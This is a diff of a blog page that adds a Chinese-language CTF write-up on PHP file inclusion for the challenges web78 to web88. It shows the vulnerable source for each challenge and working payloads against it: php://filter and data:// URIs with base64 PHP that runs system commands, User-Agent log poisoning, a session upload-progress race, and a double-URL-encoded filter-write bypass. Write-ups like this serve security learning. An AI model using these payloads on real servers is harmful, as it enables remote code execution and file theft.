@@ -305,10 +305,217 @@
         <!--<div class="toc-entry-content"> <!-- 套嵌目录使用（主要为了支援评论）-->
         
         <div class="entry-content">
-          <h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><p>index.php?file=php://filter/read=convert.base64-encode/resource=flag.php</p>
-<h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><p>index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=</p>
-<p>index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCJubCAqIik/Pg==</p>
+          <h3 id="关于文件包含"><a href="#关于文件包含" class="headerlink" title="关于文件包含"></a>关于文件包含</h3><p>程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。</p>
+<h4 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h4><p>程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，<br>但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。</p>
+<h4 id="常见的函数"><a href="#常见的函数" class="headerlink" title="常见的函数"></a>常见的函数</h4><p>PHP:include() , include_once() , require_once() , fopen() , readfile()等</p>
+<h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><pre><code>&lt;?php
 
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 10:52:43
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-16 10:54:20
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET[&#39;file&#39;])){
+    $file = $_GET[&#39;file&#39;];
+    include($file);
+}else{
+    highlight_file(__FILE__);
+}</code></pre><p>用PHP伪协议</p>
+<p>index.php?file=php://filter/read=convert.base64-encode/resource=flag.php</p>
+<h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><pre><code>&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:10:14
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-16 11:12:38
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET[&#39;file&#39;])){
+    $file = $_GET[&#39;file&#39;];
+    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);
+    include($file);
+}else{
+    highlight_file(__FILE__);
+}</code></pre><p>过滤了php，输入的php被替换成了???，通过base64的方式绕过</p>
+<p>data协议</p>
+<pre><code>index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpOz8+  //&lt;?php system(&quot;ls&quot;)?&gt;
+
+index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg== //&lt;?php system(&quot;cat flag.php&quot;)?&gt;
+
+index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCJubCAqIik7Pz4=  //&lt;?php system(&quot;nl *&quot;)?&gt;</code></pre><h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><pre><code>&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-16 11:26:29
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET[&#39;file&#39;])){
+    $file = $_GET[&#39;file&#39;];
+    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);
+    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);
+    include($file);
+}else{
+    highlight_file(__FILE__);
+}</code></pre><p>php和data都被过滤了，可以利用远程文件包含或者日志文件包含</p>
+<p>远程文件包含意思就是在自己的服务器上写马，然后包含</p>
+<p>日志文件包含:<code>?file=/var/log/nginx/access.log</code></p>
+<p>可以看到</p>
+<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20210120225449.png" alt></p>
+<p>我们的浏览器UA被写进了日志文件，那么我们将我们的UA修改为<code>&lt;?php system(&#39;cat f*&#39;);?&gt;</code>，然后包含就行了</p>
+<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20210120233753.png" alt></p>
+<h3 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h3><pre><code>&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-16 15:51:31
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET[&#39;file&#39;])){
+    $file = $_GET[&#39;file&#39;];
+    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);
+    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);
+    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);
+    include($file);
+}else{
+    highlight_file(__FILE__);
+}</code></pre><p><code>:</code>也被过滤了，不过不影响日志文件包含</p>
+<h3 id="web82-86"><a href="#web82-86" class="headerlink" title="web82-86"></a>web82-86</h3><pre><code>&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-16 19:34:45
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET[&#39;file&#39;])){
+    $file = $_GET[&#39;file&#39;];
+    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);
+    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);
+    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);
+    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);
+    include($file);
+}else{
+    highlight_file(__FILE__);
+}</code></pre><p><code>.</code>都被过滤了，太难了不会，直接放大师傅的博客吧<a href="https://www.cnblogs.com/NPFS/p/13795170.html" target="_blank" rel="noopener">https://www.cnblogs.com/NPFS/p/13795170.html</a></p>
+<p>考点是利用PHP_SESSION_UPLOAD_PROGRESS进行文件包含</p>
+<p>从php5.4开始有个session.upload_progress功能，这个功能是默认开启的，当我们向服务器中上传文件的时候，PHP会把上传文件的详细信息存储在session中，比如上传进度，上传时间等信息。</p>
+<p>在session的默认选项中，session.use_strict_mode默认是off，也就是说我们可以自定义Session ID，比如我们在Cookie里写PHPSESSID=flag，那么PHP就会在服务器上创建一个文件：/tmp/sess_flag</p>
+<p>但是另一个session.upload_progress.cleanup功能，在默认状态下处于开启状态，意思就是如果文件上传完毕，session文件内容就会被清除，那么我们就可以通过条件竞争，在清除之前来进行包含。</p>
+<p>通过HTML文件上传数据</p>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;body&gt;
+&lt;form action=&quot;http://a6699cac-25ff-4360-94c5-ee50dfb067d2.chall.ctf.show/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;2333&quot; /&gt;
+&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;
+&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+&lt;?php
+    session_start();
+?&gt;</code></pre><p>然后抓包修改</p>
+<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20210121005345.png" alt></p>
+<p>准备利用Intruder同时发上传文件请求和文件包含请求</p>
+<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20210121011819.png" alt></p>
+<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20210121011833.png" alt></p>
+<p>字典只要大一点就行，将两个爆破请求都开启</p>
+<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20210121011633.png" alt></p>
+<h3 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h3><pre><code>&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-16 21:57:55
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+if(isset($_GET[&#39;file&#39;])){
+    $file = $_GET[&#39;file&#39;];
+    $content = $_POST[&#39;content&#39;];
+    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);
+    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);
+    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);
+    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);
+    file_put_contents(urldecode($file), &quot;&lt;?php die(&#39;大佬别秀了&#39;);?&gt;&quot;.$content);
+
+
+}else{
+    highlight_file(__FILE__);
+}</code></pre><p>可以看到我们所输入的$content之前，被拼接上了<?php die('大佬别秀了');?></p>
+<p>这个时候我们用php://filter将其解码，然后再拼接我们的语句。因为php://filter流的base64-decode方法，可以将<code>$content</code>解码，利用php base64_decode函数特性去除前边的语句。</p>
+<p>详细分析看P神文章：<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list" target="_blank" rel="noopener">谈一谈php://filter的妙用</a></p>
+<p>再分析题目</p>
+<p>在 file_put_contents进行写入操作之前，我们所传的$file中的<code>php</code>、<code>data</code>、<code>：</code>、<code>.</code>都被str_replace过滤掉了，这时我们可以使用url编码绕过（这里第一次url编码）</p>
+<pre><code> file_put_contents(urldecode($file), &quot;&lt;?php die(&#39;大佬别秀了&#39;);?&gt;&quot;.$content);</code></pre><p>然后我们传入的$file再次被urldecode解码，也就是说，我们的$file需要被两次url编码</p>
+<pre><code>file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%36%34%25%33%31%25%36%31%25%33%30%25%32%65%25%37%30%25%36%38%25%37%30    //两次url解码后变成
+php://filter/write=convert.base64-decode/resource=d1a0.php</code></pre><p>然后就是<?php die('大佬别秀了');?>，这句话经过上边的base64过滤，仅剩下phpdie六个字符，我们需要再加两个字符（base64算法解码时是4个byte一组），让他们被base64解码，从而不影响我们的PHP语句。</p>
+<pre><code>aa      +       PD9waHAgc3lzdGVtKCdjYXQgZionKTs/Pg==
+aaPD9waHAgc3lzdGVtKCdjYXQgZionKTs/Pg==</code></pre><h3 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h3><pre><code>&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-17 02:27:25
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+ */
+if(isset($_GET[&#39;file&#39;])){
+    $file = $_GET[&#39;file&#39;];
+    if(preg_match(&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;, $file)){
+        die(&quot;error&quot;);
+    }
+    include($file);
+}else{
+    highlight_file(__FILE__);
+}</code></pre><p>又过滤了一大堆</p>
+<p>利用之前的data协议</p>
+<pre><code>index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpOz8+  //&lt;?php system(&quot;ls&quot;)?&gt;
+
+index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg== //&lt;?php system(&quot;cat flag.php&quot;)?&gt;
+
+index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCJubCAqIik7Pz4=  //&lt;?php system(&quot;nl *&quot;)?&gt;</code></pre><p>因为=被过滤了，所以去掉就行了，不影响base64解码</p>
+<pre><code>PD9waHAgc3lzdGVtKCJubCAqIik7    //&lt;?php system(&quot;nl *&quot;);</code></pre>
         </div>
         <!-- .entry-content -->
         
